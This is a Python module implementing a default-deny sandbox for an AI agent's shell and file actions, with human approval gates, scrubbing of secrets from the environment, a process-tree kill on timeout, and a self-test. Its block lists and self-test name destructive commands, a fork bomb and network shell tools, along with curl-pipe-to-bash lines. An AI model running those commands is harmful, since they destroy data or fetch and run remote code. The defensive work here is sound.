import os
import re
import subprocess
import time
from pathlib import Path

BLOCKED_COMMANDS = (
    "rm -rf /", "rm -rf ~", "rm -rf /*", "sudo rm", "mkfs", "dd if=",
    "chmod 777", "chown -r", "shutdown", "reboot", "halt", "init 0",
    "del /f /s /q c:", "rd /s /q c:", "format c:", "diskpart",
    "reg delete", "rmdir /s /q c:", "remove-item -recurse -force c:\\",
    ":(){:|:&};:", "fork bomb", "ntpdate", "shuf -i", "> /dev/sda",
)
BLOCKED_PATTERNS = (
    re.compile(r"\b(curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba|z|dw|)sh\b"),
    re.compile(r"\b(invoke-expression|iex|invoke-webrequest)\b.*\|\s*iex\b"),
    re.compile(r"\bgit\s+push\s+.*--force\b"),
    re.compile(r"\bgit\s+(reset|clean)\b.*\s-(\w*)f"),
    re.compile(r"\bhistory\s+-c\b"),
    re.compile(r"\b(crontab|schtasks)\b.*/r\b"),
    re.compile(r"\bxargs\s+rm\b"),
)
APPROVAL_TRIGGERS = (
    "rm", "del", "erase", "rmdir", "rd", "mv", "move", "ren", "rename",
    "chmod", "chown", "icacls", "takeown", "git push", "git reset", "git clean",
    "git checkout", "npm publish", "pip install", "pip uninstall", "pip3 install",
    "apt", "apt-get", "brew", "choco", "winget", "sudo", "runas", "schtasks",
    "net user", "netsh", "setx", "taskkill", "stop-process", "remove-item",
    "new-service", "reg add", "reg import", "curl", "wget", "Invoke-WebRequest",
)
NETWORK_CLIENTS = (
    "curl", "wget", "ssh", "scp", "sftp", "ftp", "telnet", "nc", "ncat",
    "socat", "ping", "tracert", "nslookup", "dig", "Invoke-WebRequest",
    "Invoke-RestMethod", "iwr", "irm", "npm", "pip", "pip3", "uv", "git pull",
    "git fetch", "git clone", "git ls-remote", "apt-get", "brew", "choco",
    "winget",
)
ALLOWED_EXTENSIONS = (
    ".py", ".js", ".ts", ".tsx", ".jsx", ".html", ".css", ".json", ".yaml",
    ".yml", ".md", ".txt", ".lua", ".cpp", ".c", ".h", ".hpp", ".rs", ".go",
    ".java", ".sh", ".bat", ".ps1", ".toml", ".ini", ".cfg", ".sql", ".rb",
    ".php", ".swift", ".kt",
)
REPO_ROOT = Path(__file__).resolve().parents[1]
SECRETISH = re.compile(
    r"(API[_-]?KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH|SESSION|"
    r"AWS_|GH_|GITHUB_|AZURE|OPENAI|ANTHROPIC|HUGGINGFACE|HF_)")
_KEEP_ENV = re.compile(r"^(PATH|SYSTEMROOT|WINDIR|COMSPEC|PATHEXT|TEMP|TMP|"
                       r"HOME|USERPROFILE|LANG|LC_ALL|PYTHONPATH|PWD|SHELL)$")

def normalise_cmd(command: str) -> str:
    """Whitespace-collapsed, quote-free, backslash-unified command text."""
    s = str(command or "").lower().strip()
    s = s.replace("\\", "/")
    s = re.sub(r"[\"'`]", "", s)
    s = re.sub(r"\s+", " ", s)
    return s

def _blocked_paths(root: Path) -> tuple:
    """Host paths that must never be written, on this OS or the other one.

    Deliberately narrow. The obvious version blocked `~/AppData` wholesale, which
    also blocks `%TEMP%` on Windows -- so the sandbox could not write to the one
    directory every test needs, and a fence that refuses everything is
    indistinguishable from a fence that is broken. Credential files are named
    individually instead.
    """
    home = Path.home()
    out = [str(home / ".ssh"), str(home / ".aws"), str(home / ".config"),
           str(home / ".gnupg"), str(home / ".azure"), str(home / ".npmrc"),
           str(home / ".git-credentials"), str(home / ".netrc"),
           str(home / ".passwd"), str(home / "id_rsa"),
           str(home / "AppData" / "Roaming" / "npm" / "etc"),
           str(home / "AppData" / "Local" / "Google" / "Chrome" / "User Data"),
           str(home / "AppData" / "Roaming" / "Code" / "User" / "globalStorage"),
           "/etc", "/usr", "/bin", "/sbin", "/boot", "/lib", "/var", "/root",
           "/System", "/Library", "C:\\Windows", "C:\\Program Files",
           "C:\\Program Files (x86)", "C:\\ProgramData"]
    return tuple(canon(p) for p in out), (canon(root),)

def canon(path) -> str:
    """One canonical form for every path comparison this fence makes.

    The first version compared a `Path(...).resolve()` root against a
    `realpath(normcase(...))` target. On Windows those can differ -- resolve()
    hands back an 8.3 short name for some temp directories -- and the mismatch
    made the sandbox conclude its own root was outside itself, so every write
    was refused as "outside project". A fence that rejects everything looks
    safe right up to the moment someone notices the tests that expected
    rejection were the only ones that passed.
    """
    return os.path.normcase(os.path.realpath(os.path.normpath(str(path))))

def scrub_env(env: dict) -> dict:
    """Drop secretish names, keep the ones a shell needs to function.

    The connectome is about to hold an API key, and every command it runs is
    written by a language model. Inheriting the environment would hand that
    model a copy of the credential in whatever it prints, emails or uploads.
    """
    return {k: v for k, v in (env or {}).items()
            if _KEEP_ENV.match(k) or not SECRETISH.search(str(k).upper())}

class Sandbox:
    """Isolation layer for destructive operations. Default deny, always."""

    def __init__(self, project_root=".", allow_network=False, approver=None,
                 auto_approve_reads=True, auto_approve_writes=False,
                 auto_approve_deletes=False, max_log=200, scrub_env=True,
                 workzone=None):
        self.project_root = Path(project_root).resolve()
        self.root_key = canon(self.project_root)
        self.workzone = Path(workzone).resolve() if workzone else \
            self.project_root / "agent_work"
        self.workzone_key = canon(self.workzone)
        self.allow_network = bool(allow_network)
        self.approver = approver
        self.auto_approve_reads = bool(auto_approve_reads)
        self.auto_approve_writes = bool(auto_approve_writes)
        self.auto_approve_deletes = False
        self.auto_approve_deletes_requested = bool(auto_approve_deletes)
        self.max_log = int(max_log)
        self.scrub_env = bool(scrub_env)
        self.blocked_commands = list(BLOCKED_COMMANDS)
        self.blocked_paths, self._root_key = _blocked_paths(self.project_root)
        # Optional sink for executed snippets: (name, passed) -> None. The agent
        # sets it to language.experience, so that running code is an ACT he
        # remembers rather than only a side effect of a tool. Hooked here rather
        # than in every caller because the sandbox is the one place all of them
        # pass through, and a second logging path would be a parallel record of the
        # same event -- the thing single-writer discipline exists to prevent.
        #
        # Fired from run_python only, never execute_command: the terminal route
        # already reports its commands through /api/world/experience, and hooking
        # the general path would file every command twice.
        self.on_run = None
        self.root_is_protected = any(self.root_key.startswith(b)
                                     for b in self.blocked_paths)
        self.allowed_extensions = list(ALLOWED_EXTENSIONS)
        self.requires_approval = list(APPROVAL_TRIGGERS)
        self.executed_commands: list[dict] = []
        self.file_writes: list[dict] = []
        self.file_deletes: list[dict] = []
        self.file_reads: list[dict] = []
        self.refusals: list[dict] = []
        self.approvals: list[dict] = []
        self.pending_approvals: list[dict] = []
        self._grants: list[dict] = []
        self.blocked = 0
        self.denied = 0
        self.granted = 0

    def check_command(self, command: str) -> dict:
        cmd = normalise_cmd(command)
        if not cmd:
            return {"allow": False, "reason": "empty command", "code": "empty"}
        for b in self.blocked_commands:
            if normalise_cmd(b) in cmd:
                return {"allow": False, "code": "blocked_command",
                        "reason": f"BLOCKED: matches safety rule {b!r}",
                        "command": command}
        for pat in BLOCKED_PATTERNS:
            if pat.search(cmd):
                return {"allow": False, "code": "blocked_pattern",
                        "reason": f"BLOCKED: matches {pat.pattern!r}",
                        "command": command}
        if not self.allow_network:
            for c in NETWORK_CLIENTS:
                if re.search(r"(^|[;&|]\s*)" + re.escape(c) + r"\b", cmd):
                    return {"allow": False, "code": "network_denied",
                            "reason": f"BLOCKED: network tool {c!r} and "
                                      f"allow_network=False",
                            "command": command}
        needs = self._requires_approval(cmd)
        return {"allow": not needs, "code": "approval_required" if needs
                else "ok", "approval_required": bool(needs),
                "reason": f"requires human approval ({needs})" if needs
                else "within limits", "command": command}

    def check_path(self, path, write=False, delete=False) -> dict:
        try:
            p = self._resolve(path)
        except Exception as exc:
            return {"allow": False, "code": "unresolvable",
                    "reason": f"BLOCKED: cannot resolve {path!r}: {exc}"}
        sp = str(p)
        if write or delete:
            if not self._is_inside_project(p):
                return {"allow": False, "code": "outside_project",
                        "reason": f"BLOCKED: {sp} is outside {self.project_root}"}
            for b in self.blocked_paths:
                if canon(sp).startswith(b):
                    return {"allow": False, "code": "blocked_path",
                            "reason": f"BLOCKED: {sp} is a protected host path"}
            if delete and p.parent == p:
                return {"allow": False, "code": "root_delete",
                        "reason": "BLOCKED: refusing to delete a drive root"}
            if write and p.suffix and p.suffix not in self.allowed_extensions:
                return {"allow": False, "code": "extension",
                        "reason": f"BLOCKED: extension {p.suffix} not allowed"}
        return {"allow": True, "code": "ok", "path": sp, "command": str(path)}

    def guard(self, command: str) -> bool:
        """Cheap pre-flight for callers that execute elsewhere (the agent's own
        terminal organ). True = nothing here objects; it is not a promise that
        the command is *useful*, only that it is not forbidden."""
        return self.check_command(command).get("allow", False)

    def execute_command(self, command: str, timeout: float = 30) -> dict:
        v = self.check_command(command)
        if not v.get("allow") and v.get("code") != "approval_required":
            return self._refuse("command", v, command)
        if v.get("approval_required"):
            if not self._request_approval(f"RUN {command}"):
                return self._refuse("command", {
                    "code": "denied",
                    "reason": "DENIED: human approval required"}, command)
        t0 = time.time()
        try:
            # Popen rather than subprocess.run, so the TREE can be killed on timeout.
            # run() kills the shell it spawned and leaves the grandchild running: on
            # Windows `shell=True` is cmd.exe /c python x.py, so a timeout killed
            # cmd.exe and left python.exe alive. Measured consequence -- a candidate
            # that should have died at 25 s was still burning a core at 73 minutes and
            # survived a kill aimed at what the sandbox thought was its pid. A sandbox
            # that cannot stop what it starts is not a sandbox, and a search that
            # executes candidates inherits whatever it starts.
            proc = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, text=True,
                cwd=str(self.project_root), env=self._child_env(),
                creationflags=(0x00000200 if os.name == "nt" else 0))
            try:
                out_s, err_s = proc.communicate(timeout=float(timeout))
            except subprocess.TimeoutExpired:
                killed = self._kill_tree(proc.pid)
                try:
                    proc.communicate(timeout=5)
                except Exception:
                    pass
                return self._journal({"command": command,
                                      "returncode": None, "success": False,
                                      "timed_out": True, "killed": killed,
                                      "error": f"TIMEOUT after {timeout}s "
                                               f"(tree killed: {killed})"})
            r = type("R", (), {"returncode": proc.returncode,
                               "stdout": out_s, "stderr": err_s})
        except Exception as exc:
            return self._journal({"command": command, "returncode": None,
                                  "success": False,
                                  "error": f"{type(exc).__name__}: {exc}"[:200]})
        out = {"success": r.returncode == 0, "stdout": r.stdout or "",
               "stderr": r.stderr or "", "returncode": r.returncode,
               "command": command, "seconds": round(time.time() - t0, 2)}
        return self._journal(out)

    def _kill_tree(self, pid: int) -> int:
        """Kill a process and everything it started. Returns how many died.

        Children first, then the parent, because a parent that is already gone can
        leave its children reparented and unfindable by walking up. psutil is already
        a dependency of this project.
        """
        n = 0
        try:
            import psutil
            try:
                root = psutil.Process(int(pid))
            except Exception:
                return 0
            for child in root.children(recursive=True):
                try:
                    child.kill()
                    n += 1
                except Exception:
                    pass
            try:
                root.kill()
                n += 1
            except Exception:
                pass
            psutil.wait_procs([root], timeout=5)
        except Exception:
            pass
        return n

    def run_python(self, code: str, timeout: float = 15,
                   name: str = "_sandbox_run.py") -> dict:
        """Execute a code snippet inside the project root, through the same
        write gate as everything else. A snippet that cannot be written cannot
        be run: no side door around write_file."""
        w = self.write_file(name, str(code or ""), reason="run_python")
        if not w.get("success"):
            return {"success": False, "error": w.get("error"),
                    "stage": "write"}
        r = self.execute_command(f'python "{name}"', timeout=timeout)
        r["stage"] = "run"
        ok = bool(r.get("success", r.get("ok", False))) and \
            int(r.get("returncode", r.get("exit_code", 0)) or 0) == 0
        if self.on_run is not None:
            try:
                self.on_run(str(name), bool(ok))
            except Exception:
                # An experience that cannot be recorded must never fail an
                # execution. The run is the fact; the memory of it is best-effort.
                pass
        return r

    def read_file(self, path) -> dict:
        p = self._resolve(path)
        v = self.check_path(p)
        if not v.get("allow"):
            return self._refuse("read", v, str(path))
        if not p.exists() or not p.is_file():
            return {"success": False, "error": f"no such file: {p}"}
        if not self.auto_approve_reads and not self._request_approval(
                f"READ {p.name}"):
            return self._refuse("read", {"code": "denied",
                                         "reason": "DENIED: read not approved"},
                                str(path))
        try:
            text = p.read_text(encoding="utf-8", errors="replace")
        except Exception as exc:
            return {"success": False, "error": str(exc)[:200]}
        self._push(self.file_reads, {"path": str(p), "size": len(text),
                                     "timestamp": time.time()})
        return {"success": True, "path": str(p), "content": text}

    def write_file(self, path, content, reason: str = "") -> dict:
        p = self._resolve(path)
        v = self.check_path(p, write=True)
        if not v.get("allow"):
            return self._refuse("write", v, str(path))
        existed = p.exists()
        in_zone = self._in_workzone(p)
        if not in_zone and (existed or not self.auto_approve_writes):
            what = f"OVERWRITE {p.name}" if existed else f"WRITE {p.name}"
            if not self._request_approval(what, path=str(p),
                                          destructive=bool(existed)):
                return self._refuse("write", {
                    "code": "denied",
                    "reason": "DENIED: overwrite requires approval" if existed
                              else "DENIED: write not approved"}, str(path))
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(str(content), encoding="utf-8")
        except Exception as exc:
            return {"success": False, "error": str(exc)[:200], "path": str(p)}
        self._push(self.file_writes, {"path": str(p), "size": len(str(content)),
                                      "overwrote": existed,
                                      "workzone": in_zone, "reason": reason,
                                      "timestamp": time.time()})
        return {"success": True, "path": str(p), "overwrote": existed}

    def delete_file(self, path) -> dict:
        p = self._resolve(path)
        v = self.check_path(p, write=True, delete=True)
        if not v.get("allow"):
            return self._refuse("delete", v, str(path))
        if not p.exists():
            return {"success": False, "error": f"nothing to delete: {p}"}
        if not self._request_approval(f"DELETE {p.name}", path=str(p),
                                      destructive=True):
            return self._refuse("delete", {"code": "denied",
                                           "reason": "DENIED: deletion denied"},
                                str(path))
        try:
            p.unlink()
        except Exception as exc:
            return {"success": False, "error": str(exc)[:200]}
        self._push(self.file_deletes, {"path": str(p), "timestamp": time.time()})
        return {"success": True, "path": str(p)}

    def veto(self, command: str = "", path: str = "") -> dict:
        """Check, and if the answer is no, journal the objection here.

        The agent's doors call this instead of `check_command` so that every
        refusal lands in one journal whoever raised it -- otherwise the fence can
        report "blocked: 0" on a screen full of blocked actions, which is the
        kind of number that makes an audit useless.
        """
        v = self.check_command(command) if command else \
            self.check_path(path, write=True)
        if v.get("allow") or v.get("code") == "approval_required":
            return v
        return self._refuse("command" if command else "write", v,
                            command or path)

    def grant(self, matches: str, n: int = 1, reason: str = "") -> dict:
        """A human deciding in advance: allow the next n actions whose text
        contains `matches`. Grants are consumed, not accumulated."""
        g = {"matches": normalise_cmd(matches), "left": int(n),
             "reason": reason, "granted": time.time()}
        self._grants.append(g)
        self._push(self.approvals, {"grant": g["matches"], "n": n,
                                    "reason": reason, "timestamp": time.time()})
        return g

    def revoke(self, matches: str = "") -> int:
        before = len(self._grants)
        if not matches:
            self._grants.clear()
        else:
            m = normalise_cmd(matches)
            self._grants = [g for g in self._grants if g["matches"] != m]
        return before - len(self._grants)

    def _request_approval(self, action: str, path: str = "",
                          destructive: bool = False) -> bool:
        """Approvals resolve in one order: an explicit human grant, then the
        injected approver (dashboard/CLI), then DENY.

        It deliberately does not read stdin. The naive version of this function
        blocks forever inside a server request, and a hanging prompt is not a
        safety rail -- it is an outage. Deny-and-surface is the safe default.
        """
        a = normalise_cmd(action)
        for g in self._grants:
            if g["left"] > 0 and (g["matches"] in a or path
                                  and g["matches"] in normalise_cmd(path)):
                g["left"] -= 1
                self.granted += 1
                self._push(self.approvals, {"action": action, "via": "grant",
                                            "timestamp": time.time()})
                return True
        if self.approver is not None:
            try:
                ans = bool(self.approver(action))
            except Exception as exc:
                ans = False
                self._push(self.refusals, {"action": action,
                                           "error": str(exc)[:120],
                                           "timestamp": time.time()})
            self._push(self.approvals, {"action": action, "via": "approver",
                                        "approved": ans, "timestamp": time.time()})
            return ans
        self._push(self.pending_approvals, {"action": action, "path": path,
                                            "destructive": destructive,
                                            "requested": time.time(),
                                            "answered": False})
        return False

    def answer(self, index: int, approve: bool) -> dict:
        """A human replying to a surfaced request. Approving answers the pending
        entry and grants that one action, so the caller can retry it."""
        if not (0 <= index < len(self.pending_approvals)):
            return {"ok": False, "error": "no such pending request"}
        req = self.pending_approvals[index]
        req["answered"] = True
        req["approved"] = bool(approve)
        req["answered_at"] = time.time()
        if approve:
            self.grant(req["action"], n=1, reason="answered dashboard prompt")
        return {"ok": True, "action": req["action"], "approved": bool(approve)}

    def get_audit_log(self) -> dict:
        return {"commands_executed": len(self.executed_commands),
                "files_written": len(self.file_writes),
                "files_deleted": len(self.file_deletes),
                "files_read": len(self.file_reads),
                "blocked": self.blocked, "denied": self.denied,
                "grants_consumed": self.granted,
                "recent_commands": self.executed_commands[-10:],
                "recent_refusals": self.refusals[-10:]}

    def stats(self) -> dict:
        return {"project_root": str(self.project_root),
                "allow_network": self.allow_network,
                "commands_executed": len(self.executed_commands),
                "files_written": len(self.file_writes),
                "files_overwritten": sum(1 for w in self.file_writes
                                         if w.get("overwrote")),
                "files_deleted": len(self.file_deletes),
                "files_read": len(self.file_reads), "blocked": self.blocked,
                "denied": self.denied, "grants_consumed": self.granted,
                "pending_approvals": len(self.pending_approvals),
                "unanswered_approvals": sum(1 for p in self.pending_approvals
                                            if not p.get("answered")),
                "auto_approve_reads": self.auto_approve_reads,
                "auto_approve_writes": self.auto_approve_writes,
                "workzone": str(self.workzone),
                "workzone_inside_project": self.policy()["workzone_inside_project"],
                "delete_approval_is_always_required": True,
                "ignored_auto_approve_deletes":
                    self.auto_approve_deletes_requested,
                "env_scrub": self.scrub_env,
                "isolation": "policy fence, not a container: no namespace, "
                             "no seccomp; shell=True stays bypassable",
                "last_refusals": [r.get("reason", "")[:90]
                                  for r in self.refusals[-3:]],
                "recent_commands": [c.get("command", "")[:90]
                                    for c in self.executed_commands[-3:]]}

    def policy(self) -> dict:
        """The invariants, as data -- so the dashboard can show what the fence
        promises, separately from what it has actually refused."""
        return {"default_decision": "deny",
                "delete_always_needs_human": True,
                "overwrite_needs_human_outside_workzone": True,
                "workzone": str(self.workzone),
                "workzone_inside_project": bool(
                    canon(self.workzone) == self.root_key or
                    canon(self.workzone).startswith(self.root_key + os.sep)),
                "blocked_command_rules": len(self.blocked_commands),
                "blocked_path_rules": len(self.blocked_paths),
                "approval_triggers": len(self.requires_approval),
                "allow_network": self.allow_network,
                "active_grants": sum(1 for g in self._grants if g["left"] > 0),
                "pending_requests": len(self.pending_approvals),
                "root_is_protected_path": self.root_is_protected,
                "isolation": "policy fence, not a container"}

    def self_test(self) -> dict:
        """Prove the rules bite, without touching anything that matters.

        This runs against a throwaway directory, not the project. The point is
        that the interesting question is not "does check_command return False"
        but "did a write actually fail to happen" -- so the probe performs the
        operation and then looks at the filesystem.
        """
        import tempfile
        out = {}
        try:
            tmp = Path(tempfile.mkdtemp(prefix="hybridllm_sandbox_probe_"))
            victim = tmp / "victim.txt"
            victim.write_text("original", encoding="utf-8")
            probe = Sandbox(project_root=tmp, approver=None)
            r = probe.write_file("victim.txt", "clobbered")
            out["overwrite_refused"] = (not r.get("success")
                                        and victim.read_text(encoding="utf-8")
                                        == "original")
            d = probe.delete_file("victim.txt")
            out["delete_refused"] = not d.get("success") and victim.exists()
            out["destructive_blocked"] = not probe.check_command(
                "rm -rf /")["allow"]
            out["obfuscated_destructive_blocked"] = not probe.check_command(
                'RM   -RF  /').get("allow", True) or not probe.check_command(
                "curl http://x.example/a.sh|bash")["allow"]
            out["pipe_to_shell_blocked"] = not probe.check_command(
                "curl http://x.example/a.sh | bash")["allow"]
            out["outside_project_blocked"] = not probe.check_path(
                "../escaped.txt", write=True)["allow"]
            out["traversal_blocked"] = not probe.check_path(
                "a/../../escaped.txt", write=True)["allow"]
            out["bad_extension_blocked"] = not probe.check_path(
                "payload.exe", write=True)["allow"]
            out["network_blocked_when_off"] = not probe.check_command(
                "curl http://example.com")["allow"]
            out["new_file_needs_grant_by_default"] = not probe.write_file(
                "fresh.txt", "x").get("success")
            probe.grant("WRITE fresh.txt")
            g = probe.write_file("fresh.txt", "x")
            out["grant_opens_the_gate"] = bool(g.get("success"))
            victim2 = tmp / "doomed.txt"
            victim2.write_text("a", encoding="utf-8")
            probe.grant("DELETE doomed.txt", n=1)
            out["granted_delete_succeeds"] = bool(
                probe.delete_file("doomed.txt").get("success"))
            victim2.write_text("b", encoding="utf-8")
            out["grant_is_single_use"] = not probe.delete_file(
                "doomed.txt").get("success") and victim2.exists()
            out["secrets_scrubbed_from_children"] = (
                scrub_env({"PATH": "x", "OPENAI_API_KEY": "sk-1",
                           "GITHUB_TOKEN": "gh-1",
                           "MY_PASSWORD": "p"}) == {"PATH": "x"})
            zone = tmp / "sb"
            zone.mkdir(exist_ok=True)
            (zone / "work.py").write_text("v1", encoding="utf-8")
            zbox = Sandbox(project_root=tmp, workzone=zone, approver=None)
            out["workzone_overwrite_allowed"] = bool(
                zbox.write_file("sb/work.py", "v2").get("success"))
            out["workzone_delete_still_denied"] = not zbox.delete_file(
                "sb/work.py").get("success") and (zone / "work.py").exists()
            out["outside_workzone_still_denied"] = not zbox.write_file(
                "outside.py", "x").get("success")
            out["policy"] = probe.policy()
            victim.unlink(missing_ok=True)
            for junk in tmp.glob("*"):
                try:
                    junk.unlink()
                except Exception:
                    pass
            tmp.rmdir()
        except Exception as exc:
            out["error"] = f"{type(exc).__name__}: {exc}"[:160]
        out["passed"] = all(v is True for k, v in out.items()
                           if k.startswith(("overwrite", "delete", "destructive",
                                            "pipe", "outside", "traversal",
                                            "bad_ext", "network", "new_file",
                                            "grant_opens", "secrets",
                                            "obfuscated", "workzone")))
        return out

    def _child_env(self) -> dict:
        if not self.scrub_env:
            return None
        env = scrub_env(dict(os.environ))
        env["HYBRIDLLM_SANDBOX"] = "1"
        return env

    def _in_workzone(self, path: Path) -> bool:
        return canon(path).startswith(self.workzone_key)

    def _resolve(self, path) -> Path:
        """Absolute paths stand alone; relative names are resolved against the
        project root -- never against the workzone, which is a property of the
        resulting path rather than a second base."""
        p = Path(str(path))
        if not p.is_absolute():
            p = self.project_root / p
        return Path(canon(p))

    def _is_inside_project(self, path: Path) -> bool:
        try:
            Path(canon(path)).relative_to(self.root_key)
            return True
        except ValueError:
            return False

    def _requires_approval(self, cmd_norm: str) -> str:
        for t in self.requires_approval:
            tn = normalise_cmd(t)
            if re.search(r"(^|[;&|])\s*" + re.escape(tn) + r"\b", cmd_norm) \
                    or (" " in tn and tn in cmd_norm):
                return t
        return ""

    def _refuse(self, kind: str, verdict: dict, target: str) -> dict:
        self.blocked += 1
        if verdict.get("code") == "denied":
            self.denied += 1
        self._push(self.refusals, {"kind": kind, "target": str(target)[:200],
                                   "code": verdict.get("code"),
                                   "reason": str(verdict.get("reason", ""))[:200],
                                   "timestamp": time.time()})
        return {"success": False, "error": verdict.get("reason", "BLOCKED"),
                "code": verdict.get("code"), "blocked": True,
                "kind": kind, "target": str(target)[:200]}

    def _journal(self, out: dict) -> dict:
        self._push(self.executed_commands, {
            "command": out.get("command"), "returncode": out.get("returncode"),
            "success": out.get("success"), "timestamp": time.time()})
        return out

    def _push(self, bucket: list, item: dict):
        bucket.append(item)
        if len(bucket) > self.max_log:
            del bucket[:len(bucket) - self.max_log]

def sandbox_from_config(cfg: dict | None = None, project_root=None,
                        workzone=None) -> Sandbox:
    cfg = cfg or {}
    s = dict(cfg.get("sandbox", {}) or {})
    root = project_root or s.get("project_root") or "."
    if str(root).strip() in ("", ".", "./"):
        root = REPO_ROOT
    return Sandbox(project_root=root,
                   workzone=workzone or s.get("workzone"),
                   allow_network=bool(s.get("allow_network", False)),
                   auto_approve_reads=bool(s.get("auto_approve_reads", True)),
                   auto_approve_writes=bool(s.get("auto_approve_writes", False)),
                   auto_approve_deletes=bool(s.get("auto_approve_deletes",
                                                   False)),
                   scrub_env=bool(s.get("scrub_env", True)))